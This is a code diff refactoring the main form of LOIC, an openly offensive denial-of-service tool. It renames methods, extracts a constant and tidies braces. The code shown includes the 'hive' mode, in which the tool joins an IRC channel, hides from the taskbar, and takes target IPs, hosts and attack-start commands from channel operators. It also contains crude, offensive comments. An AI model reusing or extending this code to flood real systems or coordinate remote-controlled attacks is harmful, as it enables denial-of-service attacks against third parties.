@@ -8,7 +8,6 @@ using System.Net;
 using System.Collections.Generic;
 using System.Windows.Forms;
 using System.Threading;
-using System.Text;
 using Meebey.SmartIrc4net;
 
 namespace LOIC
@@ -23,29 +22,43 @@ namespace LOIC
 		private IrcClient irc;
 		private Thread irclisten;
 		private string channel;
-		private static bool ircenabled = false;
+		private static bool ircenabled;
 		private Dictionary<string, string> OpList;
 		private delegate void CheckParamsDelegate(List<string> pars);
 		public frmMain(bool hive, bool hide, string ircserver, string ircport, string ircchannel)
 		{
 			InitializeComponent();
 			//IRC
-			if (ircserver != "") {txtIRCserver.Text = ircserver;}
-			if (ircport != "") {txtIRCport.Text = ircport;}
-			if (ircchannel != "") {txtIRCchannel.Text = ircchannel;}
+			if (ircserver != "")
+			{
+			    txtIRCserver.Text = ircserver;
+			}
+			if (ircport != "")
+			{
+			    txtIRCport.Text = ircport;
+			}
+			if (ircchannel != "")
+			{
+			    txtIRCchannel.Text = ircchannel;
+			}
+
 			//Lets try this!
 			if ( hide )
 			{
 			    this.WindowState = FormWindowState.Minimized;
 			    this.ShowInTaskbar = false;
 			}
+
 			this.FormClosing += frmMain_Closing;
 			if (hive) enableHive.Checked = true;
 			if (!hive) disableHive.Checked = true;
-		}
+        }
+
+        private const string ChargingString = "IMMA CHARGIN MAH LAZER";
+
         private void Attack(bool toggle, bool on, bool silent)
         {
-            if ((cmdAttack.Text == "IMMA CHARGIN MAH LAZER" && toggle == true) || (toggle == false && on == true))
+            if ((cmdAttack.Text == ChargingString && toggle) || (!toggle && on))
             {
                 try
                 {
@@ -119,9 +132,9 @@ namespace LOIC
 
                 tShowStats.Start();
             }
-            else if (toggle == true || on == false)
+            else if (toggle || ! on)
             {
-                cmdAttack.Text = "IMMA CHARGIN MAH LAZER";
+                cmdAttack.Text = ChargingString;
                 if (xxp != null)
                 {
                     for (int a = 0; a < xxp.Length; a++)
@@ -139,7 +152,7 @@ namespace LOIC
                 //tShowStats.Stop();
             }
         }
-        private void LockOnIP(bool silent)
+        private void LockOnIp(bool silent)
         {
             if (txtTargetIP.Text.Length == 0)
             {
@@ -151,7 +164,7 @@ namespace LOIC
             txtTarget.Text = txtTargetIP.Text;
             sHost = txtTargetIP.Text;
         }
-        private void LockOnURL(bool silent)
+        private void LockOnUrl(bool silent)
         {
             sHost = txtTargetURL.Text.ToLower();
             if (sHost.Length == 0)
@@ -230,7 +243,7 @@ namespace LOIC
                         irc.Login("LOIC_" + Functions.RandomString(), "Newfag's remote LOIC", 0, "IRCLOIC");
 
                         //Spawn a fuckign thread to handle the listen.. why!?!?
-                        irclisten = new Thread(new ThreadStart(IrcListenThread));
+                        irclisten = new Thread(IrcListenThread);
                         irclisten.Start();
                     }
                     catch
@@ -276,7 +289,6 @@ namespace LOIC
         {
             label25.Text = "Logging In...";
         }
-        private delegate void AddListBoxItemDelegate(object sender, ReadLineEventArgs e);
         void OnNames(object sender, NamesEventArgs e)
         {
             SetStatus("Connected!");
@@ -286,7 +298,10 @@ namespace LOIC
             }
             else
             {
-                if (OpList == null) OpList = new Dictionary<string, string>();
+                if (OpList == null)
+                {
+                    OpList = new Dictionary<string, string>();
+                }
             }
 
             foreach (string user in e.UserList)
@@ -407,11 +422,6 @@ namespace LOIC
                         catch
                         { }
                     }
-                    else
-                    {
-                        //disregard, he sucks cocks
-                        //irc.RfcPrivmsg(e.Data.Channel, "I'm gonna disregard that, you suck cocks");
-                    }
                 }
             }
         }
@@ -432,11 +442,11 @@ namespace LOIC
                     {
                         case "targetip":
                             txtTargetIP.Text = value;
-                            LockOnIP(true);
+                            LockOnIp(true);
                             break;
                         case "targethost":
                             txtTargetURL.Text = value;
-                            LockOnURL(true);
+                            LockOnUrl(true);
                             break;
                         case "timeout":
                             
@@ -504,7 +514,7 @@ namespace LOIC
                         Attack(false, true, true);
                         return;
                     }
-                    else if (sp[0].ToLower() == "default")
+                    if (sp[0].ToLower() == "default")
                     {
                          txtTargetIP.Text = "";
                          txtTargetURL.Text ="";
@@ -559,11 +569,11 @@ namespace LOIC
         }
 		private void cmdTargetURL_Click(object sender, EventArgs e)
 		{
-            LockOnURL(false);
+            LockOnUrl(false);
 		}
 		private void cmdTargetIP_Click(object sender, EventArgs e)
 		{
-            LockOnIP(false);
+            LockOnIp(false);
 		}
 		private void txtTarget_Enter(object sender, EventArgs e)
 		{
